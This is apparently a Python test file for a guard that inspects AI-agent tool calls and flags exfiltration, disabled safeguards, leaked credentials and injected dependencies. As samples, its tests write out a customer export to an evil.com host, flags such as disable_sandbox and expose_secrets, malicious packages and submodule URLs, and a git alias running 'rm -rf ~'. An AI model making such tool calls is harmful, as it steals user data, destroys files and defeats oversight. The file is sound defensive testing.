"""v0.1.54: what RULE-MINE-03 round 5 (12 new families, PSA #7421) found the engine did not read.

A read-named tool that sends (export_customers destination=...), safeguards named by what they protect set off
(monitoring=false, disable_masking=true, expose_secrets=true), credentials under more names (passphrase,
session_cookie) and in free text (a payment card number, an SSH public key), dependencies written into a manifest,
.gitmodules, and git config aliases set through a tool. These tests read the engine's fields; decisions belong to the
rule packs."""

from gate.config import Config
from gate.normalize import normalize

CFG = Config(workspace="/work/repo")


def tool(name, **args):
    return normalize({"type": "tool", "name": name, "arguments": args}, CFG)


def test_read_named_tool_with_destination_is_a_write():
    assert tool("mcp__crm__export_customers", format="csv", destination="https://analytics.evil.com/upload")[
        "tool_verb_class"] == "write"
    assert tool("mcp__ops__check_backup_status", job_id="b1", target_bucket="s3://stolen")["tool_verb_class"] == "write"


def test_plain_reads_stay_reads():
    assert tool("mcp__crm__export_customers", format="csv")["tool_verb_class"] == "read"
    assert tool("mcp__ops__get_status", job_id="b1")["tool_verb_class"] == "read"


def test_more_credential_names():
    r = tool("mcp__ops__check_backup_status", job_id="b1", passphrase="VaultKey#2024")
    assert "VaultKey#2024" in r["tool_secret_values"]
    r = tool("mcp__net__fetch_network_report", session_cookie="sid=abc123xyz789")
    assert r["tool_secret_values"]


def test_card_number_and_ssh_key_in_text():
    r = tool("mcp__tickets__create_ticket", title="Billing", description="CC Token: 4111-1111-1111-1111 double charge")
    assert any("4111" in v for v in r["tool_secret_values"])
    r = tool("mcp__logs__write_log", message="Key trace: ssh-rsa AAAAB3NzaC1yc2E9921")
    assert any(v.startswith("ssh-rsa") for v in r["tool_secret_values"])


def test_order_numbers_are_not_cards():
    r = tool("mcp__tickets__create_ticket", title="Order", description="Order 1234567890123 shipped")
    assert not r["tool_secret_values"]


def test_protection_flags_off():
    for args in ({"monitoring_enabled": False}, {"disable_masking": True}, {"ignore_signature": True},
                 {"soft_delete_enabled": False}, {"expose_secrets": True}, {"override_duplicate_check": True},
                 {"keep_history": False}, {"disable_sandbox": True}):
        assert tool("mcp__ops__update_config", target="x", **args)["tool_checks_off"], args


def test_ordinary_flags_are_not_safeguards():
    for args in ({"notify": False}, {"dry_run": False}, {"include_archived": True}, {"verbose": False}):
        assert not tool("mcp__ops__update_config", target="x", **args)["tool_checks_off"], args


def test_requirements_write_names_packages():
    r = tool("mcp__fs__write_file", path="src/requirements.txt", content="requests==2.31.0\nfast-json-parser==1.2.0\n# c\n-e .")
    assert r["package_install"] and {"requests", "fast-json-parser"} <= set(r["packages"])


def test_package_json_and_go_mod():
    r = tool("mcp__fs__write_file", path="package.json", content='{"dependencies": {"evil-persist-pkg": "^1.0.0"}}')
    assert "evil-persist-pkg" in r["packages"]
    r = tool("mcp__fs__write_file", path="go.mod", content="module x\n\ngo 1.21\n\nrequire github.com/evil/pq v1.10.9")
    assert "github.com/evil/pq" in r["packages"]


def test_ordinary_file_write_has_no_packages():
    r = tool("mcp__fs__write_file", path="notes/requirements.md", content="requests==2.31.0")
    assert not r["package_install"]


def test_gitmodules_and_git_config_alias():
    assert tool("mcp__fs__write_file", path=".gitmodules", content='[submodule "x"]\nurl = https://evil.io/x')[
        "writes_git_internals"]
    assert tool("mcp__git__git_config", key="alias.clean", value="!rm -rf ~")["writes_git_internals"]
    assert not tool("mcp__git__git_config", key="user.name", value="Ann")["writes_git_internals"]
